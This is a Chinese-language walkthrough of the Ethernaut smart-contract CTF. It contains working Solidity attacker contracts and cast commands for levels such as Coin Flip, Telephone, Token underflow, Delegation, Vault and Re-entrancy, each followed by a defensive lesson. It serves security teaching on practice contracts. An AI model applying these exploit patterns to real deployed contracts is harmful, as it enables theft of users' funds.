# 01 - Ethernaut CTF 攻略

## 什么是 Ethernaut

**Ethernaut** 是由 OpenZeppelin 开发的 Web3 安全 CTF（Capture The Flag）平台。每个关卡都是一个有漏洞的智能合约，你需要找到漏洞并利用它来通关。

平台地址：https://ethernaut.openzeppelin.com/

---

## 环境准备

### 方式一：浏览器控制台（官方推荐）

直接在 Ethernaut 网页中打开浏览器控制台（F12），使用内置的 `contract`、`player`、`sendTransaction` 等接口交互。

### 方式二：Foundry + 本地 Fork

```bash
# Fork Sepolia 测试网
anvil --fork-url https://sepolia.infura.io/v3/YOUR_KEY

# 使用 cast 与关卡合约交互
cast call <level_address> "owner()" --rpc-url http://localhost:8545
cast send <level_address> "contribute()" --value 0.0001ether --private-key <YOUR_KEY>
```

推荐方式二，锻炼 Foundry 技能的同时学习安全。

---

## 关卡攻略

### Level 0: Hello Ethernaut ★☆☆☆☆

**目标**：熟悉平台交互流程

**思路**：按照提示依次调用合约方法即可，重点是熟悉浏览器控制台与合约交互的方式。

```javascript
await contract.info()
await contract.info1()
await contract.info2("hello")
// 按照返回提示一步步调用
await contract.password()
await contract.authenticate("ethernaut0")
```

---

### Level 1: Fallback ★☆☆☆☆

**攻击类型**：构造函数参数、合约交互

**漏洞分析**：

```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender; // 只要满足条件就能夺取 owner
}
```

`receive()` 函数中直接修改了 `owner`，只需要先 `contribute()` 再发送 ETH 触发 `receive()`。

**攻击步骤**：

```solidity
// 1. 先贡献一点（使 contributions[msg.sender] > 0）
contract.contribute{value: 0.0001 ether}();

// 2. 直接发送 ETH 触发 receive()，夺取 owner
address(contract).call{value: 0.0001 ether}("");

// 3. 提取全部余额
contract.withdraw();
```

**防御教训**：`receive()` / `fallback()` 中不应有关键状态变更逻辑。

---

### Level 2: Fallout ★☆☆☆☆

**攻击类型**：构造函数命名错误

**漏洞分析**：

Solidity 0.6 以前，构造函数是与合约同名的函数。如果名字拼错了，它就变成了一个普通的 public 函数，任何人都能调用。

```solidity
// 合约名是 Fallout，但 "构造函数" 写成了 Fal1out（数字1不是字母l）
function Fal1out() public payable {
    owner = msg.sender;
}
```

**攻击步骤**：直接调用 `Fal1out()` 即可成为 owner。

**防御教训**：始终使用 `constructor` 关键字（Solidity 0.4.22+）。

---

### Level 3: Coin Flip ★★☆☆☆

**攻击类型**：伪随机数攻击

**漏洞分析**：

合约用 `block.number` 生成"随机数"，但 `block.number` 对同一区块内的所有交易都是公开且相同的。攻击合约可以在同一区块内计算出相同的结果。

```solidity
uint256 blockValue = uint256(blockhash(block.number - 1));
uint256 coinFlip = blockValue / FACTOR;
bool side = coinFlip == 1 ? true : false;
```

**攻击合约**：

```solidity
contract CoinFlipAttack {
    CoinFlip target;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = CoinFlip(_target);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        target.flip(side); // 用相同算法预测结果
    }
}
```

连续调用 10 次 `attack()`（每次在不同区块），即可通关。

**防御教训**：链上不存在真随机数。需要随机数时使用 Chainlink VRF 等链下预言机方案。

---

### Level 4: Telephone ★★☆☆☆

**攻击类型**：`tx.origin` 滥用

**漏洞分析**：

```solidity
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}
```

当 EOA 直接调用时 `tx.origin == msg.sender`，条件不满足。但如果通过中间合约调用，`tx.origin` 是 EOA，`msg.sender` 是中间合约，两者不同。

**攻击合约**：

```solidity
contract TelephoneAttack {
    function attack(Telephone target) external {
        target.changeOwner(msg.sender);
        // 此时在 target 内：tx.origin = EOA, msg.sender = 本合约地址
    }
}
```

**防御教训**：永远不要用 `tx.origin` 做权限校验，应该用 `msg.sender`。

---

### Level 5: Token ★★☆☆☆

**攻击类型**：整数下溢出

**漏洞分析**：

```solidity
// Solidity 0.6，没有溢出保护
function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0); // uint 永远 >= 0！
    balances[msg.sender] -= _value; // 下溢出：20 - 21 = uint256 最大值
    balances[_to] += _value;
    return true;
}
```

初始余额 20 个 token，转 21 个出去，`20 - 21` 下溢出变成天文数字。

**攻击步骤**：

```solidity
contract.transfer(anyAddress, 21);
// 你的余额从 20 变成 2^256 - 1
```

**防御教训**：使用 Solidity 0.8+（内置溢出检查）或 SafeMath 库。

---

### Level 6: Delegation ★★★☆☆

**攻击类型**：`delegatecall` + Storage 布局

**漏洞分析**：

`Delegation` 合约的 `fallback()` 会 `delegatecall` 到 `Delegate` 合约。`delegatecall` 在调用者的上下文中执行被调用合约的代码，这意味着 `Delegate.pwn()` 修改的 `owner` 实际是 `Delegation` 的 storage slot 0。

```solidity
// Delegate 合约
function pwn() public {
    owner = msg.sender; // 修改的是 Delegation 的 slot 0
}

// Delegation 合约
fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
}
```

**攻击步骤**：

```bash
# 发送 pwn() 的函数选择器触发 fallback
cast send <delegation_address> "pwn()" --private-key <KEY>
```

**防御教训**：`delegatecall` 非常危险，必须严格控制可调用的函数，确保 storage 布局一致。

---

### Level 7: Force ★★★☆☆

**攻击类型**：`selfdestruct` 强制转账

**漏洞分析**：

目标合约没有 `receive()` 或 `fallback()`，看似无法接收 ETH。但 `selfdestruct` 可以强制向任何地址发送 ETH，无视接收方是否有接收函数。

**攻击合约**：

```solidity
contract ForceAttack {
    function attack(address target) external payable {
        selfdestruct(payable(target));
    }
}
```

> 注意：`selfdestruct` 在 Cancun 升级（EIP-6780）后行为有变化，仅在合约创建的同一交易中才会真正销毁合约，但强制发送 ETH 的功能仍然有效。

**防御教训**：不要假设 `address(this).balance == 0` 就意味着没人给你转过钱。

---

### Level 8: Vault ★★☆☆☆

**攻击类型**：私有变量访问

**漏洞分析**：

`private` 只是 Solidity 编译器层面的访问限制，链上所有数据都是公开的。可以直接读取 storage slot 获取"私有"变量的值。

```solidity
bool public locked = true;    // slot 0
bytes32 private password;     // slot 1
```

**攻击步骤**：

```bash
# 读取 slot 1 的值
cast storage <vault_address> 1 --rpc-url <RPC_URL>

# 用读到的 password 解锁
cast send <vault_address> "unlock(bytes32)" <password> --private-key <KEY>
```

**防御教训**：链上没有秘密。敏感数据应该存储在链下，或使用 commit-reveal 等加密方案。

---

### Level 9: King ★★★☆☆

**攻击类型**：拒绝服务（DoS）

**漏洞分析**：

合约在接收新 king 时，会把 ETH 退还给上一个 king。如果上一个 king 是一个**拒绝接收 ETH 的合约**，退款就会失败，新的 king 永远无法上位。

```solidity
receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value); // 如果 king 拒收 ETH，这里 revert
    king = msg.sender;
    prize = msg.value;
}
```

**攻击合约**：

```solidity
contract KingAttack {
    function attack(address target) external payable {
        (bool success,) = target.call{value: msg.value}("");
        require(success);
    }
    // 没有 receive() / fallback()，无法接收退款
}
```

**防御教训**：使用"拉取"模式（Pull over Push），让用户主动领取退款，而不是合约主动推送。

---

### Level 10: Re-entrancy ★★★☆☆

**攻击类型**：经典重入攻击

**漏洞分析**：

```solidity
function withdraw(uint _amount) public {
    if (balances[msg.sender] >= _amount) {
        (bool result,) = msg.sender.call{value: _amount}(""); // 先转账
        if (result) {
            _amount;
        }
        balances[msg.sender] -= _amount; // 后更新余额
    }
}
```

转账在余额更新之前，攻击合约在 `receive()` 中再次调用 `withdraw()`，余额尚未扣减，可以反复提取。

**攻击合约**：

```solidity
contract ReentrancyAttack {
    Reentrance target;

    constructor(address _target) {
        target = Reentrance(_target);
    }

    function attack() external payable {
        target.donate{value: msg.value}(address(this));
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (address(target).balance >= msg.value) {
            target.withdraw(msg.value);
        }
    }
}
```

**防御教训**：
1. 遵循 **Checks-Effects-Interactions** 模式（先检查、再更新状态、最后外部调用）
2. 使用 OpenZeppelin 的 `ReentrancyGuard`

---

## 进阶关卡提示

后续关卡涉及更复杂的攻击面，简要提示：

| 关卡 | 核心知识点 |
|------|-----------|
| Elevator | 接口实现可以被覆写，`view` 函数可以被状态可变函数替代 |
| Privacy | storage 布局、类型打包（packing）、slot 计算 |
| Gatekeeper One | `gasleft()` 精确控制、类型转换 |
| Gatekeeper Two | `extcodesize` 在构造函数中为 0 |
| Naught Coin | ERC20 的 `approve` + `transferFrom` 绕过 `transfer` 限制 |
| Preservation | `delegatecall` 修改 storage 布局 |
| Recovery | `CREATE` 地址可预测（nonce 计算） |
| MagicNumber | 手写 EVM bytecode，合约代码 ≤ 10 opcodes |
| Denial | 无限循环消耗 gas 的 DoS |
| Shop | 类似 Elevator，接口调用可返回不同值 |
| Dex | AMM 价格操控、舍入误差 |
| Dex Two | 无校验的 token 地址，传入自定义 token |
| Puzzle Wallet | proxy + delegatecall + storage 冲突 |
| Motorbike | UUPS 代理模式、initialize 未保护 |
| DoubleEntryPoint | 代理 token 检测 + Forta 监控 |

---

## 通用解题思路

1. **读源码** — 找到关键状态变量和修改它们的路径
2. **画调用链** — 谁能调用什么函数，`msg.sender` 在每一层是谁
3. **找假设** — 合约做了哪些隐含假设？这些假设能被打破吗？
4. **写攻击合约** — 大部分关卡需要部署一个攻击合约来配合
5. **用 Foundry 本地测试** — 先在本地 fork 环境验证，再上测试网提交

---

## 参考资源

- [Ethernaut 官方](https://ethernaut.openzeppelin.com/)
- [OpenZeppelin 合约库](https://github.com/OpenZeppelin/openzeppelin-contracts)
- [SWC Registry - 智能合约弱点分类](https://swcregistry.io/)
- [Solidity by Example - Hacks](https://solidity-by-example.org/hacks/)
